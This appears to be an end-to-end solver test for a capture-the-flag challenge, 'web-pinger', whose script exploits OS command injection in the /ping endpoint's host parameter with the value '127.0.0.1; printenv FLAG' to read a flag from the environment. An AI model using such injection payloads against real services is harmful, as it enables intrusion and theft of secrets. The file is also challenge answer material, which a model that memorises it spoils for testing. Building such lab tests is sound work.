#!/usr/bin/env python3
"""
web-pinger end-to-end smoke test.
Path: OS command injection in the `host` param of /ping -> `printenv FLAG` -> capture flag.
Exit 0 = PASS.
"""
import os
import re
import sys

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10010").rstrip("/")


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def solve():
    # Inject a second command after the ping. `; printenv FLAG` prints the flag from the env.
    r = requests.get(
        f"{TARGET}/ping",
        params={"host": "127.0.0.1; printenv FLAG"},
        timeout=10,
    )
    m = re.search(r"CTF\{[^}]*\}", r.text)
    return m.group(0) if m else ""


def main():
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
